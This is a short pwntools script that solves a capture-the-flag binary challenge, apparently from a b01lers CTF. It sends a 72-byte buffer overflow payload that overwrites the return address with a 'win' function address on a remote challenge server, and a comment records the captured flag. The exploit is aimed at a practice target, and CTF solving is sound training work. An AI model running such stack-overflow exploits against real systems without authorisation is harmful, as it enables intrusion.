from pwn import *

p = remote("gold.b01le.rs", 4004)
# p = process("./chal")

win = 0x4011dd

payload  = b'A'*72
payload += p64(win)

p.sendline(b'A')
p.sendline(b'A')
p.sendline(b'A')
p.sendline(payload)

p.interactive()

# bctf{h0w_@bo0ut_a_n1ce_g@m3_0f_ch3ss?_ccb7a268f1324c84}
